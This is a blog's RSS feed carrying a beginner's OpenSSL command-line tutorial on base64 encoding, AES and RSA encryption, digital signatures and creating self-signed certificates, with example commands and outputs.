<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>:~$ Knuckle$ecurity_</title>
    <description>Burak Baris</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 22 Aug 2022 02:54:35 +0000</pubDate>
    <lastBuildDate>Mon, 22 Aug 2022 02:54:35 +0000</lastBuildDate>
    <generator>Jekyll v4.2.1</generator>
    
      <item>
        <title>My Sql Test</title>
        <description>This post will discuss all the terminologies behind the **_Public Key Infrastructure (PKI)_**.
It is essential to have knowledge of _Public Key Cryptography_, _Encryption_ and _Digital Signing_ as the prequisition.

</description>
        <pubDate>Thu, 07 Jul 2022 16:00:52 +0000</pubDate>
        <link>http://localhost:4000/2022/07/07/my-sql-test/</link>
        <guid isPermaLink="true">http://localhost:4000/2022/07/07/my-sql-test/</guid>
        
        <category>PKI</category>
        
        <category>PKC</category>
        
        <category>x509</category>
        
        <category>Cryptography</category>
        
        
      </item>
    
      <item>
        <title>OpenSSL2 CLI Tool</title>
        <description># 1-INTRODUCTION

**_OpenSSL_** is a command-line utility that facilitates cryptographic operations such as symmetric or asymmetric encryption, public-key
cryptography, hash functions, digital signatures etc. You can download the source code from [http://www.openssl.org](http://www.openssl.org/).
This guide will cover just the basic functionalities of the OpenSSL.
&lt;br&gt;&lt;br&gt;After the installation check for the version.
{% highlight bash %}
root@bbsec:~$ openssl version
OpenSSL 1.1.1m  14 Dec 2021
{% endhighlight %}&lt;br&gt;
OpenSSL contains various commands. Here is the list of them.
{% highlight bash %}
root@bbsec:~$ openssl help
Standard commands
asn1parse         ca                ciphers           cms               
crl               crl2pkcs7         dgst              dhparam           
dsa               dsaparam          ec                ecparam           
enc               engine            errstr            gendsa            
genpkey           genrsa            help              list              
nseq              ocsp              passwd            pkcs12            
pkcs7             pkcs8             pkey              pkeyparam         
pkeyutl           prime             rand              rehash            
req               rsa               rsautl            s_client          
s_server          s_time            sess_id           smime             
speed             spkac             srp               storeutl          
ts                verify            version           x509 
{% endhighlight %}&lt;br&gt;

Brief descriptions for some parameters:
- **ca**: Create certificate authorities.
- **dgst**: Compute hash functions.
- **enc**: Encryption/decryption via secret key algorithms such as a secret key stored in a file or using a password.
- **genrsa**: Create a pair of private/public keys by using the RSA algorithm.
- **password**: &quot;Hashed password&quot; generator.
- **pkcs7**: Management tools for PKCS#7 standard.
- **pkcs12**: Management tools for PKCS#12 standard.
- **rsa**: Data management for RSA.
- **rsautl**: Sign/Verif a digital signature or encrypt/decrypt with RSA.
- **rand**: Pseudo-random bit string generator.
- **verify**: X.509 digital certificate verifier.
- **x509**: Data management for X509.


# 2-SECRET KEY ALGORITHMS

It is possible to implement various types of secret key algorithms with OpenSSL. Here is the list of them.

{% highlight bash %}
root@bbsec:~$ openssl help
...
...
...
Cipher commands:
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb       
aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb      
aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb      
aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1     
aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb      
aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8     
aria-256-ctr      aria-256-ecb      aria-256-ofb      base64            
bf                bf-cbc            bf-cfb            bf-ecb            
bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc  
camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast              
cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb         
cast5-ofb         des               des-cbc           des-cfb           
des-ecb           des-ede           des-ede-cbc       des-ede-cfb       
des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb      
des-ede3-ofb      des-ofb           des3              desx              
idea              idea-cbc          idea-cfb          idea-ecb          
idea-ofb          rc2               rc2-40-cbc        rc2-64-cbc        
rc2-cbc           rc2-cfb           rc2-ecb           rc2-ofb           
rc4               rc4-40            seed              seed-cbc          
seed-cfb          seed-ecb          seed-ofb          sm4-cbc           
sm4-cfb           sm4-ctr           sm4-ecb           sm4-ofb           

{% endhighlight %}&lt;br&gt;

The list includes the _base64_ encoding standard. It is not a secret key algorithm since no secret key generated for
base64. This encoding standard converts binary input into alphanumeric characters and vice versa.
{% highlight bash %}
root@bbsec:~$ echo &quot;www.bbsec.net&quot; &gt; plaintext.txt
root@bbsec:~$ openssl enc -base64 -in textfile.txt
YmJzZWNuZXQK
root@bbsec:~$ echo &quot;YmJzZWNuZXQK&quot; &gt; encoded.txt
root@bbsec:~$ openssl enc -base64 -d -in encoded.txt
bbsecnet
{% endhighlight %}&lt;br&gt;
On the contrary, [Advanced Encryption Standard (AES)](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) is indeed a secret key algorithm.
AES algorithm requires a secret password as a key to encrypt data. So let us see how it works.

{% highlight bash %}
root@bbsec:~$ openssl enc -aes-256-cbc -pbkdf2 -in plaintext.txt -out encrtpyed.bin
enter aes-256-cbc encryption password:
Verifying - enter aes-256-cbc encryption password:

root@bbsec:~$ cat encrtyped.bin
root@bbsec:~$ &quot;Salted__W���U�j���í��R&apos;���#��b�&quot;
root@bbsec:~$ hexdump encrtpyed.bin 
0000000 6153 746c 6465 5f5f d357 dfd9 dd55 856a
0000010 aab8 adc3 a881 2752 f6b5 23f5 84a8 fe62
0000020
root@bbsec:~$ file encrtpyed.bin 
encrtpyed.bin: openssl encrypted data with salted password

root@bbsec:~$ openssl enc -d -aes-256-cbc -pbkdf2 -in encrtpyed.bin -pass pass:111111
www.bbsec.net
{% endhighlight %}&lt;br&gt;

# 3-PUBLIC KEY CRYPTOGRAPHY

This section will demonstrate how the OpenSSL manages public key algorithms. Therefore we will use one of the most common
public-key cryptography algorithm RSA.

## 3.1-Generating the Key Pair

First, we need to create an RSA public/private key pair. We will create a 2048 bit key.
{% highlight bash %}
root@bbsec:~$ openssl genrsa -out privkey.pem 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
..............+++++
......................................................................................................+++++
e is 65537 (0x010001)
root@bbsec:~$ cat privkey.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4tX0r+2pX9Mssky5Kz9ZNEvDswLjzNgO8cojNA6eHA8VSSGr
XUsbewpH89wAgZzmEk2whV28ktMh7y75HSm3b7D7bpun8ODACLaA5TpsMNdJtrG+
6kjw0Sex6RMOHoLya5Bv2bD+AtqqLNKTo5rBwKPpYs2fPOeTVFomSnyO6S1GiBNM
KD8AdBk7bLS9ejsqyv6j9q2fiL6SDeNFXup9mF3e+lb0wXfpkP7db4m06Ci1zkSb
cv4bDNXS/P0As+1Rjbu9QCFhypUFdfwR1BHl7fYxIY/HCxMXWq0xXlxmGybEGCn7
UJWWgDvqx4PbmueXWIOuAtHJ/wu6HXH43/4ztQIDAQABAoIBAA94tGXDegf1KVlH
7mFKwtTUThbJnav9GJfZR6lnTdVwGe2RBFUqqEcuHlY9rTMp9m9NKTsPd6s0B15+
/7LDg6V0ltGmgD/ntHFjsUrxPyvdo0N4wCLOss4xPOs+x3nBSLOZeGeKsOiU7YJ9
ImDIT2rKQ0Lf73qB+QSJ2Y6/DChPM17d4ZnI8gfINlrOLAvl8VAZTX+4HP7wOYAW
m9nwZ8NXvudjk6vFs5m2K2t5iZpANeLMmmTanfM4/vhHBWyVAJfT/ZpBts3Agwdw
RltplK+n/4/G1AzyoQpQcuNmuATSNqiiLuAno+UM6oqY1t31q0jObHpRIfEcS6Bo
8YhTXskCgYEA8jM6p22JYv4WGoyEdiPeVJwMFj2AoTpdqEo19+fkvHhI1MBN8E7d
qJ+mP3wChP2GEmDeW+wOqRAncJlVbh/nfH/t4WWUv6pYIwWfJ8IvgeWzbz8Wdat+
y72ut+Mu5CCIfOmZi9K58+2ObMlNFR87yK3mRsl/fa5X2fJi9i2rb6sCgYEA78Ke
qKSSWM8cjHyB5dvN0dQUtcEZ8EWagJjyX9/tfRond4x6PPQvTtX742I8GdJ6T95s
esatTw+kEIim5wSXsM+wdEtMFfU1n6oEYrMpg+sgyIp72QDQi3kr/j5Dpb4DOAOQ
Hrh5Pbyq/uFFPPzX1aBSphCRKqBLmcyk1X6dCh8CgYEA8Pc9DOSzApVPAnz5MN0A
z2cts1bfSglasxuaVBoX/dcihuEI6eRdLe4gphrIGu5tXI2ZzRSvhU64HpO/ZkBB
vCE/V7gL5SEibT2jmhfd0jvpaO34d3v3O9dtJDDYL0ma4cQ76tvt/B1GTT99/FzF
yyQQ7i59NFqntwQrp0fKv98CgYAfolcauzQQAauroZXmBR1f7RKadJL+j8B17Tg1
jC8ijXvdmyxZtII1bahhdQmnAo1e0mMPw/0D7HViNRWIb6OwEYcfoPu1/feITH9t
omP84t4dd6AlnqTlciRq1D5KtQpprpaqZv6gNa9+F6zyAg5cQl4FSTROIn43Gbg5
7w27UwKBgQDeuuDoYqszBhembtG7sT7+5Anryw5qazYxXND1nw6ikU1T9t50wr4P
oVUmGx78XnzTrLLRXG7YNIRxyih9lk07zyvWpe+4MvLNZt2Fsv68uAFXfRhCex6i
2tuq+ge7jLSujkdU3uN8pV5VPEPs9lWsM9lrmbMjO/GMx0SHd5f49g==
-----END RSA PRIVATE KEY-----
{% endhighlight %}&lt;br&gt;
A single privkey.pem file is created. The private key is encoded with the Privacy Enhanced Email (PEM) standard. 
That file contains both private and public keys. This is not what we want since
the private key must be kept secure while the public key should be distributed publicly since other people needs that public key to 
send encrypted messages to you (or to control if a document or a certificate has been signed by you).
&lt;br&gt;&lt;br&gt;The way to extract public key inside from the 
privkey.pem file as follows:
{% highlight bash %}
root@bbsec:~$ openssl rsa -in privkey.pem -pubout &gt; pubkey.pem
writing RSA key
root@bbsec:~$ cat pubkey.pem 
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzqi5qVmfLf+lCaWGbZ43
iAb3Hofr9MdIUL6i7lxIkViq8xwF90ThiKdgQ5Qn6heacXmQx0aJ9+F+HqpS47Na
aBz/NyHbzID8tSHwE6LhgS5gSsW2yl4/R5Zj3SMndZdJj9ExX6lesJDesOnzIEt7
6JMnOUinbGm9Lmtu727qBJh0KlNKmK5zUsi5ZxFcfC0onfhGWNbP1floC6KQzdY5
tS3nB7bXeuRTC4qJEYkQoXbQ3U4pLpu4vIdslwfjConBEfA9/3nWyaCXsvsSmAfC
Bl4FQVDSUjWO7mpPUujs2V+wdlH7fWXzkTmtpWOO8XtBQpYIlOqCAChpELnAv6Rf
+wIDAQAB
-----END PUBLIC KEY-----
{% endhighlight %}&lt;br&gt;

The following output indicates the details of the RSA key pair. Those details strictly related to the RSA&apos;s algorithm therefore
if you are interested in the math behind the RSA algorithm, you can conduct a further investigation on it.
{% highlight bash %}
root@bbsec:~$ openssl rsa -in privkey.pem -text -noout
RSA Private-Key: (2048 bit, 2 primes)
modulus:
    00:b3:4e:f9:71:fc:3e:af:29:f9:63:a0:38:9b:3f:
    5f:e2:0a:32:32:0c:fa:4f:c7:e7:79:b5:9b:bf:5c:
    87:9a:75:d8:1e:a6:48:09:4f:3f:95:87:aa:d7:a1:
    5d:18:a2:13:27:c4:43:03:6b:8f:e6:81:70:9c:32:
    66:8f:97:32:11:8b:3c:b4:e5:60:5c:02:c9:4a:67:
    76:00:28:68:4c:23:24:63:88:7d:14:8f:9a:6a:56:
    72:03:cd:97:d9:e8:81:9a:af:94:2b:f5:07:ef:4d:
    8b:f9:fd:d5:c7:f2:c7:91:06:89:d3:4f:dd:24:9a:
    72:60:78:aa:7d:ed:e9:07:04:78:64:9a:5f:a2:fa:
    03:24:92:9f:d5:dd:8e:b9:11:f8:dd:99:3f:03:51:
    2a:63:77:2c:d8:89:a6:0c:80:e8:5b:e4:c6:5b:10:
    c0:c8:c4:ca:46:84:c7:df:72:f9:11:7e:c2:29:81:
    e6:4c:86:c0:c4:fe:6c:a0:a7:66:83:45:44:1e:59:
    93:4c:35:fc:fb:00:67:ed:63:a3:66:e3:6b:8b:b7:
    ab:bf:f8:51:1e:af:a4:e1:09:42:41:8f:75:82:cf:
    29:2e:0e:6a:c1:19:62:f1:a0:44:bc:ad:20:06:12:
    d8:a3:fa:d8:a6:a5:5a:c5:bf:f4:9d:1a:b9:b9:5e:
    6c:6f
publicExponent: 65537 (0x10001)
privateExponent:
    00:9d:a6:81:11:23:fb:a5:1c:9d:85:67:78:7d:9e:
    f1:d9:96:a7:5d:74:25:9c:81:a1:56:54:43:74:b3:
    91:12:50:2c:4d:7e:5b:75:bb:f4:a6:ae:da:99:ad:
    e9:61:60:16:c1:6f:00:90:80:40:cc:24:e0:72:a4:
    a9:a1:f4:08:74:7e:5c:48:9c:27:e5:9e:19:86:ce:
    82:64:4f:22:ac:56:75:87:01:99:1f:bb:c6:c3:59:
    ef:f2:c2:0f:91:ea:a8:10:ed:f0:b3:d9:43:39:b6:
    8f:ac:a3:ee:13:57:b4:f9:20:ab:8b:5b:fb:8e:54:
    30:dd:fb:19:c3:90:aa:c2:9c:45:cc:a2:3f:05:57:
    4a:7a:d1:21:99:1e:bc:75:ef:8e:6d:44:48:2c:91:
    5b:2b:c7:56:44:ba:f0:7a:4a:45:de:87:6f:91:c9:
    06:9a:15:eb:3f:7b:dd:aa:47:1e:0e:8f:4c:e7:c5:
    0e:6f:b3:dd:6d:2a:99:8f:f0:8c:e1:48:e6:af:8b:
    29:3d:31:9f:94:4d:5a:76:58:42:d3:49:7d:c9:dd:
    b3:56:d0:09:8b:95:5e:08:ab:94:98:5b:9e:d4:29:
    21:8a:a6:2d:a9:2a:58:da:3f:7f:ce:0e:97:d2:06:
    a1:98:c4:4e:1f:91:05:ad:7a:d0:ab:e1:b2:69:07:
    3d:79
prime1:
    00:d8:9e:75:b1:1e:c2:f2:3f:1e:71:81:d5:6c:fe:
    40:3e:38:0d:30:2e:2c:14:36:3c:d7:09:30:58:04:
    df:dd:e7:54:d2:67:67:3d:c7:79:eb:c4:c4:5b:58:
    1a:0d:db:49:c8:0b:b9:26:19:ae:da:83:29:a3:96:
    d2:c6:df:37:53:33:7e:35:5b:54:4b:32:c2:dc:76:
    f2:8a:99:56:67:87:24:53:7d:3e:aa:90:d0:a7:06:
    70:42:4d:ca:5e:31:52:49:98:c1:08:1b:e5:24:50:
    2f:41:12:d2:f3:1a:c4:c4:c6:08:11:ac:c8:29:08:
    7f:ad:02:f2:99:28:e9:f7:5b
prime2:
    00:d3:e8:11:88:df:ce:96:de:84:0f:ed:e8:52:af:
    cb:e9:6d:0b:67:b5:20:a5:1c:52:17:3c:a6:79:ca:
    65:0c:75:bd:01:d6:ce:cc:74:0d:80:de:3a:81:f5:
    d2:d6:59:84:55:2a:d2:f4:7c:be:74:6e:8d:73:d8:
    47:7c:18:33:22:f4:78:cb:83:43:b0:db:c0:eb:8e:
    cf:d9:27:10:3f:5d:10:c9:79:90:d5:31:33:f8:a2:
    27:3d:77:c5:0a:98:54:2c:89:d1:9e:c4:bf:83:88:
    21:0e:7a:b2:e3:5b:47:a9:f1:9f:21:f7:34:e2:bc:
    16:de:11:94:07:5e:c7:ff:7d
exponent1:
    00:c4:73:38:d3:0f:cd:c6:7a:1d:b6:dd:03:5c:9c:
    5c:50:d0:ee:8c:f2:62:c1:55:ca:e9:4d:89:0d:5a:
    26:58:8d:92:2c:5a:e0:93:73:93:8b:91:60:6e:62:
    c1:06:2e:08:84:a6:b5:1b:eb:90:da:d4:b6:ef:88:
    39:d1:67:e0:39:d1:6a:35:23:85:97:c9:0a:55:7c:
    7e:4b:d9:f2:35:63:a7:3b:1c:4b:b7:ce:2b:9c:3e:
    47:92:aa:0f:cc:4a:b8:90:cc:3a:cb:8a:d8:cd:8c:
    f6:bd:f2:3f:63:7f:b4:51:ac:32:e7:2c:a6:3e:28:
    59:f9:e2:c1:76:cb:57:1c:1f
exponent2:
    2f:04:45:a7:b5:e8:b3:86:c9:8c:73:3f:e1:e0:c9:
    80:90:46:40:8b:6a:a3:d7:c5:cb:0c:14:ef:de:dd:
    4e:c7:6c:d9:54:9c:eb:b6:30:2c:d0:a1:f0:a5:e7:
    52:d1:e7:cf:b1:c1:be:a7:52:e6:a8:84:d0:18:43:
    bc:1f:ee:70:aa:07:87:38:27:b3:bc:fe:70:05:6e:
    ce:82:a1:53:3d:c5:f4:bd:f9:49:a4:32:20:cf:71:
    9f:6c:cc:96:4e:38:16:ed:b9:49:dd:e3:94:3e:86:
    ff:1c:70:46:8b:c1:39:ce:b7:7d:24:c9:62:29:53:
    75:90:36:e4:ef:bd:b6:4d
coefficient:
    00:b6:68:f2:3a:23:18:0d:a1:4e:9d:df:b1:42:8b:
    a4:cb:73:64:45:96:92:df:92:a8:40:7d:5d:f2:bf:
    f6:5f:6d:3e:b9:5f:b2:d1:08:a2:6b:e8:c2:1e:a4:
    76:72:5b:bf:f1:55:41:90:f6:b4:e0:f3:76:84:a1:
    15:91:a4:bf:d9:08:ed:a4:a6:be:42:bf:7c:27:a4:
    1f:81:0f:b6:33:bf:e5:78:a3:a9:43:77:48:ec:ce:
    fc:d4:55:73:a0:58:f8:fb:2b:7c:9c:7b:4e:19:dd:
    50:2d:91:a5:16:cc:68:48:7f:15:b5:2e:14:cb:82:
    41:73:29:70:a0:fc:a5:11:04
{% endhighlight %}&lt;br&gt;
To encrypt the private key and enhance its&apos; security, we can use symmetric key cryptography, such as DES3.
{% highlight bash %}
root@bbsec:~$ openssl rsa -in privkey.pem -des3 -out enc-priv-key.pem
writing RSA key
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
root@bbsec:~$ cat enc-priv-key.pem 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,00672B83BD258084

tiqDxmmKct026+B6ZcahTuYSgWOjSJvogkjuZc+V8SUo37NOBRWv4Ie7CEfzqOOu
WKzr8gn8WFaRgfI0W+fgsXk8TZ/9yLUB/tVF3kxaM28bItvazJSkk6XLqAsqhJu8
sXhEyi69HlyYeCXdasBjZdoEc+ma5QjGP5VYZ7wZyak6jhxn2ExH+JfkS+3l9uYi
NeD61SLo7unqV44Rl+SDCYxYN6G60Jqv6wuoG8abBadEzo9nXIBMJ2gy0H1uSSqW
ECqRB4V5T4pA9RfuolCl0x76IUWY0ZLRIBLH//pGU+KBG2ZqsFIPg/Fsh/hOfCsL
rGE/rm60wuG7bUs7qbSe0ZjF6Ktu8VdkEfwzezBuhuWSgVy1UBPZxmRzYvO64yuG
k0TLFXzhwxSeR/UJ+GRQAt2e/U6MUw6E2ktUHUAIisyLqJgbU07Xg/nSBn3Lv6aU
5hABRIijp7yAK94HAFOdkliStgO0N3X/ozJyznN/JPW6Cs8GAetiIlyKbGgIxHsH
HOqjS/Zckd82+X3npqU7DFJ6uJ1BwGBQjwTL/r92OVQSp3Rj2sIkj6n087s+iHSm
Gu/w+lBSuIvJyQH8YV/6OmDUHVR6mjOOqP2xZmSN14GxlufW8f7I/iOw4bXRIaV/
PB/VXjjoh8V9VCI8Rcpm9kn/YP75iIfBQR3eYHnVP56C434vDd/moJej7JSJcxbJ
kGPo6l35XDKhZ2rekr0ePiinhYY/BK98MsYIYxxLvL55QrjHI2H0RaNmp71UDQG9
UL1d9sAWyKXSIjF2HKCRUm1+q/r9M8OLSCQBaOZ0H716dvtr7bZ+AXACO4JSYxCT
Un2LMxM78hJ3If5Kb1C/k1OCV/BVJbVaU/ySQ+OzOVncLHYBG7jm7Ezuq5DT6v/O
1KPX4/jomd2C4ZZiBK/G4hV6MT0cVFhJv+ThKLqekXQuNkbcAojf2ndowwxkeCye
nU61PISBXI7uBLmCuJEgQy4THWbCMKgL+nUHLrshwJwyaHkzXG2MMjTcOZj0RTpZ
Il3zImidoFR7JEuBl6hkJlZvljmUSIf1+hZUnYYQWhEoPx3SXVanIm/rJrgaxTxC
k7m15T0DGdhEnAcebYChx11hH/jyRuAz31LcrgzVFfvYFJHKkboAgAc7Zoi1gU+0
mDLnsW/18jWcMO6FU6+Mh5XUWoWe7tMerwYDfZKJuumxii2ufNRZXiPoLoDq4em7
d9uQspcsr+IQG7ByB+l9Y+Lk6ymPlMR34afSnG5qHUSmgB01zyV7ov1beyivOdyl
Ja9DQCuR0KcA1HvLCa1G94QiQ2AHTAsS3mBA8rDGXqOls76lmDF+m2J+7+6XB+e3
DZstVBKti0VCfZnY4l5gW+LGCUup5OUn/NJrAT3veh9TjbxSWEd2ZfA7fdS0zfjP
d7xal0w7v30eD6l4Vx7HXjm6KF9VH+uLL41exWn/8t1LmqGIKzPwRCNVOrN6NWg7
vuMKYMuBl5yza/vfMdeGIlL4fags+EMVC3yz4+xKtHTB/aRRcigNB6hBsrCo8L+S
C1Yr6FdrosL12DFP3UFFvva58jwR+EkGQfSUjZmY67PFLcn93bzkTfV8hmPFjy9j
-----END RSA PRIVATE KEY-----

{% endhighlight %}&lt;br&gt;
Since the private key is encrypted with DES3, you must decrypt the private key back with DES3&apos;s passphrase when you 
want to decrypt messages encrypted with your public key.

## 3.2-Encryption

Since we have created the RSA key pair, we can produce a digital signature or perform encryption.
{% highlight bash %}
root@bbsec:~$ echo &quot;this file will be encrtyped with rsa&quot; &gt; plaintext.txt
root@bbsec:~$ cat plaintext.txt
this file will be encrtyped with rsa
root@bbsec:~$
root@bbsec:~$ openssl rsautl -encrypt -in plaintext.txt -pubin -inkey pubkey.pem &gt; enc-text.txt
root@bbsec:~$ cat enc-text.txt 
&quot;@X|aTvr
        3�K���G-U��qz�F��YXm8��4=v��$6w^��̫&lt;�����KH�]��
                                                      ��
��E��w-|��h;}[ݡ;)77��u��?��ޣ���Ù���P�t&apos;�T�&quot; 
{% endhighlight %}&lt;br&gt;
To decrypt the encrypted txt file, use the private key.
{% highlight bash %}
root@bbsec:~$ openssl rsautl -decrypt -in enc-text.txt -inkey privkey.pem 
this file will be encrtyped with rsa
{% endhighlight %}&lt;br&gt;

## 3.3-Digital Signatures

In this section, we will be creating a digital signature and verifying it. Since RSA can only encrypt data smaller than or equal to
the key length, first, we compute the digest of the data to sign it. Note that in practice, the procedure is a bit more complex.
The way of doing it in the real world is to implement a schema called [_RSA-PSS_](https://crypto.stackexchange.com/questions/57607/what-is-rsa-pss-and-how-is-it-different-from-a-hash).

### 3.3.1-Creating the data file then digesting it
In this instance, I will use the SHA1 hash function to digest the data.
{% highlight bash %}
root@bbsec:~$ echo &quot;this document will be signed&quot; &gt; plaintext.txt
root@bbsec:~$ openssl dgst -SHA1 plaintext.txt &gt; plaintext-sha1.txt
root@bbsec:~$ cat plaintext-sha1.txt
SHA1(plaintext.txt)= dc2fe0f7a744a48ded8ce61710c385457e35296a #Data&apos;s digest
{% endhighlight %}
### 3.3.2-Signing the digest with the private key
{% highlight bash %}
root@bbsec:~$ openssl rsautl -sign -in plaintext-sha1.txt -out signedfile -inkey privkey.pem 
root@bbsec:~$ cat signedfile 
&quot;�9�O��N�q�k������Kc��ګ�4ci��GC����6�vq���2�K�iy���Q�s���!*��P�����!M��s���/o�,�b���$iJ���������s��?4�!�a&quot;
{% endhighlight %}

### 3.3.3-Verifying the digital signature
{% highlight bash %}
root@bbsec:~$ openssl rsautl -verify -in signedfile -pubin -inkey pubkey.pem 
SHA1(plaintext.txt)= dc2fe0f7a744a48ded8ce61710c385457e35296a #Decrypted signature
{% endhighlight %}
As you can tell, the digest of the data and the result of the decrypted signature validates each other. That means signature is valid.

# 4-CREATING DIGITAL CERTIFICATES (PKI)

If you are not familiar with the _Public Key Infrastructure_, you can read it [here](https://www.bbsec.net/2022/01/01/public-key-infrastructure/).
## 4.1-Generate a key pair

{% highlight bash %}
root@bbsec:~$ openssl genrsa 2048 &gt; myprivatekey.pem
Generating RSA private key, 2048 bit long modulus (2 primes)
..........+++++
..................................................................+++++
e is 65537 (0x010001)
root@bbsec:~$ openssl rsa -in myprivatekey.pem -pubout &gt; mypublickey.pem
writing RSA key
{% endhighlight %}

## 4.2-Generate a CSR
{% highlight bash %}
openssl req -new -key myprivatekey.pem &gt; cert_req.csr

Country Name (2 letter code) [AU]:tr
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:Istanbul
Organization Name (eg, company) [Internet Widgits Pty Ltd]:BBSec
Organizational Unit Name (eg, section) []:Cyber-Sec
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:imbarisburak_buisiness@protonmail.com
A challenge password []:111111
An optional company name []: 
{% endhighlight %}
## 4.3-Act as our own CA to self-sign our own certificate
{% highlight bash %}
openssl x509 -req -in cert_req.csr -signkey myprivatekey.pem &gt; signed.cer
Signature ok
subject=C = tr, ST = Some-State, L = Istanbul, O = BBSec, OU = Cyber-Sec, emailAddress = imbarisburak_buisiness@protonmail.com
Getting Private key
{% endhighlight %}
## 4.4-Display all the information in the certificate
{% highlight bash %}
root@bbsec:~$ openssl x509 -in signed.cer -text -noout
Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number:
            34:1c:a6:c0:0d:06:8f:2c:58:46:ae:1b:17:f1:53:b6:27:52:6c:f8
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C = tr, ST = Some-State, L = Istanbul, O = BBSec, OU = Cyber-Sec, emailAddress = imbarisburak_buisiness@protonmail.com
        Validity
            Not Before: Jan  5 19:52:19 2022 GMT
            Not After : Feb  4 19:52:19 2022 GMT
        Subject: C = tr, ST = Some-State, L = Istanbul, O = BBSec, OU = Cyber-Sec, emailAddress = imbarisburak_buisiness@protonmail.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:d4:4c:57:45:97:1b:30:d8:fa:b8:5d:52:9f:be:
                    21:d8:d2:11:4b:34:bc:55:53:00:5c:e9:00:9b:87:
                    2d:6b:b1:f8:9e:3a:75:fb:96:9a:31:41:c8:2a:5e:
                    54:10:20:9f:1c:36:4d:b2:6c:66:4e:80:d3:04:19:
                    9f:3a:1a:21:3b:d1:f5:cf:5f:a4:06:6c:b5:38:bb:
                    01:8f:1f:51:82:67:6a:32:01:2d:06:83:03:79:95:
                    42:63:1a:01:87:9e:bc:17:ba:1c:03:1c:a0:92:dd:
                    56:19:a0:eb:38:42:79:43:4b:f2:d8:28:9d:f6:5b:
                    59:38:27:b7:bc:e2:23:31:57:5f:9c:46:36:00:4c:
                    b9:a9:ba:1c:74:73:3c:ad:35:ed:60:02:03:53:28:
                    44:74:c9:e9:f9:05:7f:c1:9e:57:7e:09:c3:41:17:
                    5c:77:36:08:92:64:d4:73:e8:d1:eb:79:57:dd:04:
                    b8:b4:f2:20:f0:42:df:03:68:a3:ca:f0:69:66:a3:
                    46:d4:cd:69:cd:2b:32:8e:5d:06:5c:b8:b0:b5:78:
                    3e:72:1d:cf:95:78:ea:ea:85:60:05:0c:e6:0f:3b:
                    06:3f:78:54:7f:bb:23:d8:1b:25:d8:60:ef:a2:ee:
                    21:4a:4d:22:3b:80:6f:3b:b7:42:8e:86:66:aa:67:
                    54:c9
                Exponent: 65537 (0x10001)
    Signature Algorithm: sha256WithRSAEncryption
         8c:6f:7a:b2:a7:ed:96:ed:7c:26:93:6d:4e:6c:07:c4:1b:76:
         7e:ef:08:1a:4e:15:f8:35:38:dd:88:d3:67:1a:b7:56:ee:7b:
         6e:8a:a9:e3:05:2a:69:55:3c:ec:8b:c1:45:c4:dd:97:54:e6:
         5b:c6:e4:b0:ea:b2:00:e7:e1:f6:d2:46:b2:65:67:e1:d8:bb:
         f9:89:c1:93:05:7c:6a:8c:ef:c9:76:7a:e8:3e:cc:90:21:25:
         f3:c5:4a:9f:87:18:3c:cf:50:2a:7a:1e:b8:49:65:0e:d2:a0:
         d4:cb:8b:27:5a:40:76:ee:52:30:2a:3a:70:63:2d:97:a7:31:
         49:96:60:d9:d9:17:35:02:57:f0:cd:1f:b0:54:15:49:e3:5f:
         1d:19:fd:3e:ff:03:58:f5:cd:ec:f3:a9:9e:e5:ff:b9:bc:d8:
         3d:f3:0a:4f:f5:18:5b:b8:86:4a:cb:6f:89:40:f7:3e:f5:f0:
         6c:be:d0:fd:54:91:43:0f:aa:8a:58:b7:f9:80:c9:2c:07:38:
         f6:6b:18:54:e7:d5:00:8d:ad:36:0f:47:6f:01:d6:2c:79:1b:
         04:65:61:21:1d:e7:b2:72:5b:a5:ab:01:ca:f4:33:7e:26:69:
         e9:4f:dd:f9:c9:60:27:60:a2:0c:98:2d:d4:c9:28:c3:c7:5b:
         f2:51:34:b9
{% endhighlight %}
## 4.5-Put our certificate and key in a PKCS #12 container
{% highlight bash %}
root@bbsec:~$ openssl pkcs12 -export -in signed.cer -inkey myprivatekey.pem -out p12cert.p12
Enter Export Password:
Verifying - Enter Export Password:
{% endhighlight %}
## 4.6-Display information in a PKCS12 file
{% highlight bash %}
root@bbsec:~$ openssl pkcs12 -info -in p12cert.p12 
{% endhighlight %}
## 4.6-Create a key and a self-signed certificate in one command
{% highlight bash %}
openssl req -new -x509 -newkey rsa:2048 -out new_cert.cer -keyout new_key.pem
{% endhighlight %}
</description>
        <pubDate>Wed, 05 Jan 2022 14:00:00 +0000</pubDate>
        <link>http://localhost:4000/2022/01/05/OpenSSL2-CLI-Tool/</link>
        <guid isPermaLink="true">http://localhost:4000/2022/01/05/OpenSSL2-CLI-Tool/</guid>
        
        <category>OpenSSL</category>
        
        <category>PKI</category>
        
        <category>PKC</category>
        
        <category>Cryptography</category>
        
        <category>x509</category>
        
        <category>Encryption</category>
        
        
      </item>
    
      <item>
        <title>OpenSSL CLI Tool</title>
        <description># 1-INTRODUCTION

